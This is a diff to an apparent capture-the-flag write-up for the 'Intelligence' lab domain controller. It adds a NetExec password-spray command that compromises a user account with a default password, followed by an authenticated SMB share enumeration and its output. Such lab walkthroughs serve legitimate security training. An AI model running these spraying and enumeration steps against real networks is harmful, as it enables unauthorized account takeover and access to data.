@@ -346,5 +346,24 @@ Ill spray this against some of the users found in the metadata of the PDFs
 ```python
 nxc smb dc.intelligence.htb -u users.txt -p 'NewIntelligenceCorpUser9876' --continue-on-success
 
-
+SMB         10.129.95.154    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
 ```
+User compromise
+
+## Access on shares
+```python
+nxc smb dc.intelligence.htb -u tiffany.molina -p 'NewIntelligenceCorpUser9876' --shares             
+SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.95.154   445    DC               [+] intelligence.htb\tiffany.molina:NewIntelligenceCorpUser9876 
+SMB         10.129.95.154   445    DC               [*] Enumerated shares
+SMB         10.129.95.154   445    DC               Share           Permissions     Remark
+SMB         10.129.95.154   445    DC               -----           -----------     ------
+SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.95.154   445    DC               C$                              Default share
+SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.95.154   445    DC               IT              READ            
+SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
+SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
+SMB         10.129.95.154   445    DC               Users           READ
+```
+Read access on quite a few share
